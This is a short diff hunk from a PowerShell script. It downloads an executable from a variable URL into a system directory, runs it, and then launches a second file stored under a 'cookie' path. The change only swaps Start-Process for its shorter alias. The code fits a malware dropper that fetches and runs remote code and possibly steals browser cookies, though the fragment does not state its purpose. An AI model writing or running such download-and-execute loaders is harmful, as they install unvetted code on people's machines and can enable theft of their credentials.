@@ -16,6 +16,6 @@ $getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
 
 Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
 
-Start-Process -FilePath $getfilePath
+Start -FilePath $getfilePath
 
 Start-Process -FilePath $cookiePath
